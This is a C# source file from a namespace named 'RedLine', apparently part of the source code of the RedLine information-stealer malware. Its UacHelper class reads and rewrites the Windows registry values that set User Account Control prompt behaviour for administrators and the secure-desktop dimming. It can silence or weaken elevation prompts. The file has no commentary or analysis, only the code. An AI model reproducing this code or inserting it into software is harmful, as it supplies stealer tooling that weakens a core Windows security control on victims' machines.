using Microsoft.Win32;
using RedLine.Models.UAC;
using System;

namespace RedLine.Logic.Helpers
{
  public static class UacHelper
  {
    private const string RegistryAddress = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

    public static AdminPromptType AdminPromptBehavior
    {
      get
      {
        if (Environment.OSVersion.Version.Major < 6)
          return AdminPromptType.AllowAll;
        using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
        {
          using (RegistryKey registryKey2 = registryKey1.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", false))
          {
            AdminPromptType adminPromptType1 = AdminPromptType.DimmedPromptForNonWindowsBinaries;
            AdminPromptType adminPromptType2 = (AdminPromptType) (registryKey2?.GetValue("ConsentPromptBehaviorAdmin", (object) adminPromptType1) as int? ?? (int) adminPromptType1);
            if (UacHelper.ForceDimPromptScreen)
            {
              if (adminPromptType2 == AdminPromptType.Prompt)
                return AdminPromptType.DimmedPrompt;
              if (adminPromptType2 == AdminPromptType.PromptWithPasswordConfirmation)
                return AdminPromptType.DimmedPromptWithPasswordConfirmation;
            }
            return adminPromptType2;
          }
        }
      }
      set
      {
        if (value == UacHelper.AdminPromptBehavior)
          return;
        using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
        {
          using (RegistryKey registryKey2 = registryKey1.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
          {
            if (UacHelper.ForceDimPromptScreen)
            {
              if (value == AdminPromptType.Prompt)
                value = AdminPromptType.DimmedPrompt;
              if (value == AdminPromptType.PromptWithPasswordConfirmation)
                value = AdminPromptType.DimmedPromptWithPasswordConfirmation;
            }
            registryKey2?.SetValue("ConsentPromptBehaviorAdmin", (object) (int) value);
          }
        }
      }
    }

    public static bool ForceDimPromptScreen
    {
      get
      {
        if (Environment.OSVersion.Version.Major < 6)
          return false;
        using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
        {
          using (RegistryKey registryKey2 = registryKey1.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", false))
            return (registryKey2?.GetValue("PromptOnSecureDesktop", (object) 0) as int? ?? 0) > 0;
        }
      }
      set
      {
        if (value == UacHelper.ForceDimPromptScreen)
          return;
        using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
        {
          using (RegistryKey registryKey2 = registryKey1.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true))
            registryKey2?.SetValue("PromptOnSecureDesktop", (object) (value ? 1 : 0));
        }
      }
    }
  }
}
